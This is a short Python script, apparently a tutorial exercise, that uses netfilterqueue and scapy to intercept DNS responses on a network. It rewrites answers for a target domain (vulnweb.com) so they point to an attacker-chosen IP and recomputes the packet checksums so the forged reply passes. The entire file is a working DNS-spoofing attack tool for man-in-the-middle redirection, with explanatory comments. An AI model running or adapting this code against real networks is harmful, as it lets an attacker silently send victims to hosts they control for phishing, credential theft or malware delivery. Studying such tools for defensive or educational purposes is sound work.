import netfilterqueue
import scapy.all as scapy


target_domain = "vulnweb.com"
ip_to_redirect = "000.000.000.000"


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSRR = DNS resource record, is the answer of a DNSQR (DNS question record)
    if scapy_packet.haslayer(scapy.DNSRR):
        # qname holds the site domain name
        qname = scapy_packet[scapy.DNSQR].qname
        if target_domain in str(qname):
            print("[+] Spoofing target")
            # creating a DNSRR answer:
            # scapy will fill the fields that we dont specify in our DNSRR, so we just need to modify the ones we want to modify, the rrname and the rdata (where the ip is)
            answer = scapy.DNSRR(rrname=qname, rdata=ip_to_redirect)
            # switching the original answer to ours
            scapy_packet[scapy.DNS].an = answer
            # editing the answer count
            scapy_packet[scapy.DNS].ancount = 1
            # removing the len and chksum from the ip and udp layers - scapy will recalculate and fill those fields for us, based in our modified answer
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # set the original packet payload to our modified packet
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
